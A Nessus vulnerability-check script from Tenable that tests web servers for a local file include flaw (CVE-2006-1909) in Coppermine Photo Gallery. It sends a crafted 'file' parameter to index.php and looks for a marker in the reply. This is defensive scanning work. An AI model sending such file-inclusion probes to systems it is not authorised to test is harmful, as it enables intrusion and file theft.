#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21240);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1909");
  script_bugtraq_id(17570);

  script_name(english:"Coppermine Photo Gallery file Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read a local file using Coppermine Photo Gallery");

  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include issue. 

Description :

The version of Coppermine Gallery installed on the remote host fails
to properly sanitize input to the 'file' parameter of the 'index.php'
script before using it in a PHP 'include_once()' function.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit this issue to view arbitrary files or
to execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/431062/30/0/threaded
http://coppermine-gallery.net/forum/index.php?topic=30655.0

Solution :

Upgrade to Coppermine version 1.4.5 or later.

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("coppermine_gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit a flaw to read the albums folder index.php.
  file = ".//./albums/index";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "file=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if the result looks like the albums folder's index.php.
  if ("Albums Folder</title>" >< res)
  {
    security_note(port);
    exit(0);
  }
}
